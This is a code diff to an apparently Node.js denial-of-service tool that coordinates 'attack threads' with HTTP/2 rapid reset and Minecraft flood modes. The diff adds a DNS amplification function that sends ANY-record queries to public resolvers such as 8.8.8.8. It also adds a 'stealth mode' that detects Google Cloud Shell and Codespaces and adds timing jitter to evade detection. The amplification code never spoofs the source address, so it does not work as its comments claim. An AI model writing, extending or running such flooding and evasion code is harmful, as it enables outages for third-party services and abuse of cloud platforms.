@@ -184,7 +184,11 @@ async function startAttack(config) {
   }
   log('🚀 ATTACK STARTED');
   
-  const endTime = attackStartTime + (config.duration * 1000);
+  // Calculate exact end time
+  const durationMs = config.duration * 1000;
+  const endTime = attackStartTime + durationMs;
+  
+  log(`⏰ Attack will run until: ${new Date(endTime).toLocaleTimeString()}`);
   
   const threads = [];
   for (let i = 0; i < config.threads; i++) {
@@ -195,10 +199,16 @@ async function startAttack(config) {
     if (isRunning) {
       reportStats();
       updateDisplay();
+    } else {
+      clearInterval(statsInterval);
     }
   }, 1000);
   
-  await Promise.all(threads);
+  // Wait for all threads to complete OR timeout
+  await Promise.race([
+    Promise.all(threads),
+    new Promise(resolve => setTimeout(resolve, durationMs + 5000)) // Add 5s buffer
+  ]);
   
   clearInterval(statsInterval);
   
@@ -210,8 +220,8 @@ async function startAttack(config) {
   });
   http2Sessions.clear();
   
-  const duration = ((Date.now() - attackStartTime) / 1000).toFixed(2);
-  const rps = (stats.sent / duration).toFixed(2);
+  const actualDuration = ((Date.now() - attackStartTime) / 1000).toFixed(2);
+  const rps = (stats.sent / actualDuration).toFixed(2);
   
   reportStats();
   
@@ -220,7 +230,8 @@ async function startAttack(config) {
     console.log('╔════════════════════════════════════════╗');
     console.log('║       ATTACK SUMMARY REPORT            ║');
     console.log('╠════════════════════════════════════════╣');
-    console.log(`║  Duration:            ${duration.toString().padStart(16)}s ║`);
+    console.log(`║  Expected Duration:   ${config.duration.toString().padStart(16)}s ║`);
+    console.log(`║  Actual Duration:     ${actualDuration.toString().padStart(16)}s ║`);
     console.log(`║  Requests Sent:       ${stats.sent.toString().padStart(16)} ║`);
     console.log(`║  Successful:          ${stats.success.toString().padStart(16)} ║`);
     console.log(`║  Failed:              ${stats.failed.toString().padStart(16)} ║`);
@@ -236,6 +247,7 @@ async function startAttack(config) {
 async function attackThread(config, endTime) {
   const isMinecraft = config.attackMode && config.attackMode.startsWith('minecraft-');
   const isHTTP2 = config.attackMode === 'http2-rapid-reset';
+  const isDNSAmp = config.attackMode === 'dns-amplification';
   
   let resolvedIP = null;
   if (config.bypassDNS || isMinecraft) {
@@ -266,6 +278,8 @@ async function attackThread(config, endTime) {
     
     if (isMinecraft) {
       sendMinecraftAttack(config, resolvedIP);
+    } else if (isDNSAmp) {
+      await sendDNSAmplification(config);
     } else if (isHTTP2 && http2Supported) {
       try {
         await sendHTTP2RapidReset(config);
@@ -764,6 +778,79 @@ function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+// DNS Amplification Attack
+async function sendDNSAmplification(config) {
+  try {
+    const dgram = require('dgram');
+    const target = config.target.replace('https://', '').replace('http://', '').split('/')[0];
+    
+    // Common DNS amplification queries (ANY record requests)
+    const domains = [
+      'isc.org',
+      'ripe.net', 
+      'google.com',
+      'facebook.com',
+      'cloudflare.com'
+    ];
+    
+    const domain = domains[Math.floor(Math.random() * domains.length)];
+    
+    // Build DNS query for ANY record (maximum amplification)
+    const query = Buffer.concat([
+      Buffer.from([
+        Math.floor(Math.random() * 256), Math.floor(Math.random() * 256), // Transaction ID
+        0x01, 0x00, // Flags (standard query)
+        0x00, 0x01, // Questions
+        0x00, 0x00, // Answer RRs
+        0x00, 0x00, // Authority RRs
+        0x00, 0x00  // Additional RRs
+      ]),
+      buildDNSQuery(domain),
+      Buffer.from([
+        0x00, 0xff, // Type: ANY
+        0x00, 0x01  // Class: IN
+      ])
+    ]);
+    
+    const socket = dgram.createSocket('udp4');
+    
+    // Send to public DNS resolvers (they amplify the response)
+    const dnsServers = [
+      '8.8.8.8',    // Google
+      '1.1.1.1',    // Cloudflare
+      '208.67.222.222', // OpenDNS
+      '9.9.9.9'     // Quad9
+    ];
+    
+    const dnsServer = dnsServers[Math.floor(Math.random() * dnsServers.length)];
+    
+    socket.send(query, 53, dnsServer, (err) => {
+      if (err) {
+        stats.failed++;
+      } else {
+        stats.success++;
+      }
+      socket.close();
+    });
+    
+  } catch (error) {
+    stats.failed++;
+  }
+}
+
+function buildDNSQuery(domain) {
+  const parts = domain.split('.');
+  const buffers = [];
+  
+  parts.forEach(part => {
+    buffers.push(Buffer.from([part.length]));
+    buffers.push(Buffer.from(part));
+  });
+  buffers.push(Buffer.from([0x00])); // Null terminator
+  
+  return Buffer.concat(buffers);
+}
+
 // Minecraft Protocol Functions
 function writeVarInt(value) {
   const bytes = [];
@@ -886,6 +973,33 @@ console.log(`
 ║  💡 For localhost use ws://           ║
 ╚════════════════════════════════════════╝
 `);
+
+// Stealth mode for Google Cloud Shell / Codespaces
+const isCloudEnvironment = process.env.CLOUD_SHELL || process.env.CODESPACES || 
+                          process.env.GOOGLE_CLOUD_PROJECT || process.env.DEVCONTAINER;
+
+if (isCloudEnvironment) {
+  console.log('[!] Cloud environment detected - Enabling stealth mode');
+  console.log('[!] Rate limiting enabled to avoid detection');
+  
+  // Override stats reporting to be less frequent
+  const originalReportStats = reportStats;
+  let lastReportTime = 0;
+  reportStats = function() {
+    const now = Date.now();
+    if (now - lastReportTime > 5000) { // Report every 5 seconds instead of 1
+      originalReportStats();
+      lastReportTime = now;
+    }
+  };
+  
+  // Add random delays to avoid pattern detection
+  const originalSleep = sleep;
+  sleep = function(ms) {
+    const jitter = Math.random() * 50; // Add 0-50ms random jitter
+    return originalSleep(ms + jitter);
+  };
+}
 
 connect();
 
